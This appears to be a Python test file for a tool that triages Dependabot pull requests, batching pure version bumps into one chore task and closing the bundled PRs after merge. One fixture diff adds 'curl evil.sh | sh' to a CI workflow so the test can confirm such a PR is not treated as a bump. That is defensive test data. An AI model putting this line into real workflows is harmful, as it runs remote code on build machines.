"""D-129: o executor cuida dos PRs do Dependabot (R11).

Inventario e triagem (bump = so manifesto/lockfile, ou so linhas `uses:` de
workflow; o resto e item comum para a pr-audit; rotulo `security` = hotfix).
O lote e uma demanda `chore` criada por `guia deps --now` ou pelo executor com
a fila vazia (on-idle), sem duplicar. PRs do bot nunca entram na fila normal.
Depois do merge do lote, cada PR incorporado e fechado com link para o lote.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

from conftest_paths import CORE_LOCK, CORE_SRC, ensure_core_importable

ensure_core_importable()

import _dependabot  # noqa: E402

A = "a" * 40
USES_DIFF = (
    "diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\n"
    "--- a/.github/workflows/ci.yml\n+++ b/.github/workflows/ci.yml\n"
    "@@ -1,3 +1,3 @@\n-      - uses: actions/checkout@v4\n+      - uses: actions/checkout@v5\n"
)
CODE_DIFF = (
    "diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\n"
    "--- a/.github/workflows/ci.yml\n+++ b/.github/workflows/ci.yml\n"
    "@@ -1,3 +1,3 @@\n-        run: pytest\n+        run: pytest && curl evil.sh | sh\n"
)
BOT_PRS = [
    {"number": 11, "title": "Bump actions/checkout", "labels": [], "files": [".github/workflows/ci.yml"], "diff": USES_DIFF},
    {"number": 12, "title": "Bump requests", "labels": ["security"], "files": ["requirements.txt"], "diff": ""},
    {"number": 13, "title": "Bump x", "labels": [], "files": [".github/workflows/ci.yml"], "diff": CODE_DIFF},
    {"number": 14, "title": "Bump y", "labels": [], "files": ["src/app.py"], "diff": ""},
]


class TriageTests(unittest.TestCase):
    def test_classifies_bumps_and_flags_security(self) -> None:
        triage = {t["number"]: t for t in _dependabot.triage(BOT_PRS)}
        self.assertTrue(triage[11]["bump"])
        self.assertTrue(triage[12]["bump"])
        self.assertTrue(triage[12]["security"])
        self.assertFalse(triage[13]["bump"], "workflow com linha alem do uses: nao e bump")
        self.assertIn("uses:", triage[13]["reason"])
        self.assertFalse(triage[14]["bump"])


@unittest.skipUnless(shutil.which("git"), "git nao disponivel")
class DepsCliTests(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.sb = Path(self._tmp.name)
        (self.sb / "core" / "src").mkdir(parents=True)
        (self.sb / "core" / "lock").mkdir(parents=True)
        for src in CORE_SRC.glob("*.py"):
            if not src.name.startswith("__"):
                shutil.copy2(src, self.sb / "core" / "src" / src.name)
        shutil.copy2(CORE_LOCK / "lock_api.py", self.sb / "core" / "lock" / "lock_api.py")
        subprocess.run(["git", "init", "-q"], cwd=self.sb, check=True, capture_output=True)
        (self.sb / ".guia").mkdir()
        (self.sb / ".guia" / "process.json").write_text(json.dumps({"delivery": {"mode": "pr"}}), encoding="utf-8")
        self.fixture = self.sb / "gh.json"
        self.fixture.write_text(json.dumps({"__auth__": True, "__dependabot__": BOT_PRS}), encoding="utf-8")

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def _run(self, *args: str) -> subprocess.CompletedProcess[str]:
        return subprocess.run(
            [sys.executable, "core/src/guia.py", *args],
            cwd=self.sb, capture_output=True, text=True, encoding="utf-8",
            env={**os.environ, "GUIA_GH_FIXTURE": str(self.fixture)},
        )

    def _ok(self, *args: str) -> subprocess.CompletedProcess[str]:
        result = self._run(*args)
        self.assertEqual(result.returncode, 0, msg=f"{args}: {result.stdout}{result.stderr}")
        return result

    def _tasks(self) -> list[dict]:
        path = self.sb / ".guia" / "tasks.json"
        return json.loads(path.read_text(encoding="utf-8"))["tasks"] if path.exists() else []

    def _lotes(self) -> list[dict]:
        return [t for t in self._tasks() if t.get("dependabot")]

    def test_deps_lists_without_creating_anything(self) -> None:
        data = json.loads(self._ok("deps", "--json").stdout)
        self.assertEqual([p["number"] for p in data["bumps"]], [11, 12])
        self.assertEqual([p["number"] for p in data["others"]], [13, 14])
        self.assertTrue(data["security"])
        self.assertEqual(self._lotes(), [])

    def test_deps_now_creates_one_lote_chore(self) -> None:
        self._ok("deps", "--now")
        lotes = self._lotes()
        self.assertEqual(len(lotes), 1)
        lote = lotes[0]
        self.assertEqual(lote["kind"], "chore")
        self.assertIn("Dependabot", lote["title"])
        self.assertEqual(lote["dependabot"]["prs"], [11, 12])
        self.assertTrue(lote["dependabot"]["security"])
        self._ok("deps", "--now")
        self.assertEqual(len(self._lotes()), 1, "lote aberto nao e duplicado")

    def test_executor_on_idle_creates_the_lote_and_never_queues_bot_prs(self) -> None:
        self._ok("queue", "run")
        self.assertEqual(len(self._lotes()), 1)
        queue = self.sb / ".guia" / "queue.json"
        items = json.loads(queue.read_text(encoding="utf-8"))["items"] if queue.exists() else []
        self.assertEqual(items, [], "PR do bot nunca entra na fila normal")

    def test_merged_lote_closes_the_incorporated_prs(self) -> None:
        self._ok("deps", "--now")
        lote = self._lotes()[0]
        path = self.sb / ".guia" / "tasks.json"
        data = json.loads(path.read_text(encoding="utf-8"))
        for task in data["tasks"]:
            if task["id"] == lote["id"]:
                task["status"] = "Em PR"
                task["pr"] = {"number": 90, "url": "u", "branch": "b90", "head": A}
                task["audit"] = {"result": "approved", "auditedSha": A, "auditedPatchId": "p"}
        path.write_text(json.dumps(data), encoding="utf-8")
        (self.sb / ".guia" / "queue").mkdir(exist_ok=True)
        (self.sb / ".guia" / "queue" / f"{lote['id']}.msg").write_text("x: lote\n\ncorpo\n", encoding="utf-8")
        Path(str(self.fixture) + ".prs.json").write_text(json.dumps([
            {"number": 90, "head": A, "state": "OPEN", "mergeState": "CLEAN", "checks": "pass", "patchIds": {A: "p"}}
        ]), encoding="utf-8")
        self._ok("queue", "add", lote["id"])
        self._ok("approve", lote["id"])
        self._ok("queue", "run")
        closed = json.loads(Path(str(self.fixture) + ".closed.json").read_text(encoding="utf-8"))
        self.assertEqual(sorted(c["number"] for c in closed), [11, 12])
        self.assertTrue(all("#90" in c["comment"] for c in closed))


if __name__ == "__main__":
    unittest.main()
